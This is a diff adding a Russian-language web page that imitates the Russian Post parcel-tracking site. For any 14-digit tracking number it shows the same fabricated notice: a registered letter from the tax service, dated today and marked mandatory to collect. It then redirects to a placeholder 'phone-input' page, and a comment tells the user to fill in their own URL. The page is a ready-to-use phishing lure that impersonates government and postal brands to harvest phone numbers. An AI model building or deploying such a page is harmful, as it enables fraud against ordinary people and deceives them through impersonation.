@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Отслеживание письма</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+  body, html {
+    margin: 0; padding: 0;
+    height: 100%;
+    background-color: #F6F7F9;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .container {
+    text-align: center;
+    width: 320px;
+    max-width: 90vw;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+    padding: 10px;
+    box-sizing: border-box;
+  }
+
+  .logo {
+    width: 150px;
+    margin: 0 auto;
+    animation: pulse 2s ease-in-out 2 forwards;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.85; }
+  }
+
+  .track-form,
+  .info-box,
+  #continueButton {
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.6s ease, transform 0.6s ease;
+    width: 100%;
+    max-width: 320px;
+  }
+
+  .show {
+    opacity: 1 !important;
+    transform: translateY(0) !important;
+  }
+
+  .track-form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    align-items: center;
+  }
+
+  input {
+    padding: 12px 15px;
+    font-size: 18px;
+    border: 1.8px solid #ccc;
+    border-radius: 6px;
+    width: 100%;
+    font-weight: 400;
+    letter-spacing: 2px;
+    outline-offset: 2px;
+    outline-color: transparent;
+    transition: outline-color 0.3s, border-color 0.3s;
+    text-align: center;
+    box-sizing: border-box;
+  }
+  input:focus {
+    outline-color: #1928DC;
+    border-color: #1928DC;
+  }
+
+  button {
+    background-color: #1928DC;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 18px;
+    font-weight: 600;
+    padding: 12px 25px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    width: 100%;
+  }
+  button:hover {
+    background-color: #0f1ab0;
+  }
+
+  .error-message {
+    color: #DC1928;
+    font-size: 14px;
+    margin-top: 8px;
+    height: 18px;
+    font-weight: 500;
+  }
+
+  .info-box {
+    margin-top: 10px;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    text-align: left;
+    font-size: 16px;
+    display: none;
+    box-sizing: border-box;
+  }
+
+  .info-box p {
+    margin: 8px 0;
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  /* Адаптив для мобильных */
+  @media (max-width: 400px) {
+    .container {
+      max-width: 90vw;
+      padding: 8px;
+    }
+
+    .logo {
+      width: 120px;
+    }
+
+    input {
+      font-size: 16px;
+      padding: 10px 12px;
+      letter-spacing: 1.5px;
+    }
+
+    button {
+      font-size: 16px;
+      padding: 10px 20px;
+    }
+
+    .info-box {
+      font-size: 14px;
+      padding: 15px;
+    }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <img 
+      src="https://www.pochta.ru/assets/Logo_Kirillicza_Dvuhstrochnyj_256d5530b1.jpg" 
+      alt="Логотип Почты России" class="logo" id="logo" />
+
+    <form class="track-form" id="trackForm" novalidate>
+      <input 
+        type="text" 
+        id="trackInput" 
+        maxlength="17" 
+        inputmode="numeric" 
+        autocomplete="off"
+        required
+        placeholder="Введите трек-номер"
+      />
+      <button type="submit">Продолжить</button>
+    </form>
+
+    <div class="error-message" id="errorMessage"></div>
+
+    <div class="info-box" id="infoBox">
+      <p><strong>Отправитель:</strong> ФНС</p>
+      <p><strong>Дата отправки:</strong> <span id="sendDate"></span></p>
+      <p><strong>Тип:</strong> Заказное письмо</p>
+      <p><strong>Статус:</strong> Обязательно к получению</p>
+    </div>
+
+    <button id="continueButton" style="display:none;">Продолжить</button>
+  </div>
+
+<script>
+  const form = document.getElementById('trackForm');
+  const input = document.getElementById('trackInput');
+  const errorMessage = document.getElementById('errorMessage');
+  const logo = document.getElementById('logo');
+  const infoBox = document.getElementById('infoBox');
+  const sendDate = document.getElementById('sendDate');
+  const continueBtn = document.getElementById('continueButton');
+
+  logo.addEventListener('animationend', (e) => {
+    if (e.animationName === 'pulse') {
+      form.classList.add('show');
+      input.focus();
+    }
+  });
+
+  function formatTrackNumber(value) {
+    let digits = value.replace(/\D/g, '').slice(0,14);
+    let parts = [];
+    parts.push(digits.slice(0,4));
+    if(digits.length > 4) parts.push(digits.slice(4,8));
+    if(digits.length > 8) parts.push(digits.slice(8,12));
+    if(digits.length > 12) parts.push(digits.slice(12,14));
+    return parts.filter(Boolean).join('-');
+  }
+
+  input.addEventListener('input', () => {
+    const cursorPos = input.selectionStart;
+    const oldLength = input.value.length;
+    input.value = formatTrackNumber(input.value);
+    const newLength = input.value.length;
+    const diff = newLength - oldLength;
+
+    if(diff > 0 && cursorPos === oldLength) {
+      input.selectionEnd = cursorPos + diff;
+    } else {
+      input.selectionEnd = cursorPos;
+    }
+  });
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    const rawValue = input.value.replace(/\D/g, '');
+    if (rawValue.length !== 14) {
+      errorMessage.textContent = 'Трек-номер должен содержать ровно 14 цифр.';
+      input.focus();
+    } else {
+      errorMessage.textContent = '';
+      const today = new Date();
+      const formattedDate = today.toLocaleDateString('ru-RU', {
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric'
+      });
+      sendDate.textContent = formattedDate;
+
+      infoBox.style.display = 'block';
+      requestAnimationFrame(() => infoBox.classList.add('show'));
+      continueBtn.style.display = 'block';
+      requestAnimationFrame(() => continueBtn.classList.add('show'));
+    }
+  });
+
+  continueBtn.addEventListener('click', () => {
+    [form, infoBox, continueBtn].forEach(el => {
+      el.classList.remove('show');
+      el.style.pointerEvents = 'none';
+    });
+
+    setTimeout(() => {
+      form.style.display = 'none';
+      infoBox.style.display = 'none';
+      continueBtn.style.display = 'none';
+
+      logo.style.animation = 'none';
+      void logo.offsetWidth;
+      logo.style.animation = 'pulse 2s ease-in-out 2 forwards';
+
+      setTimeout(() => {
+        window.location.href = 'https://example.com/phone-input'; // <- укажи свой URL
+      }, 4000);
+    }, 600);
+  });
+</script>
+</body>
+</html>
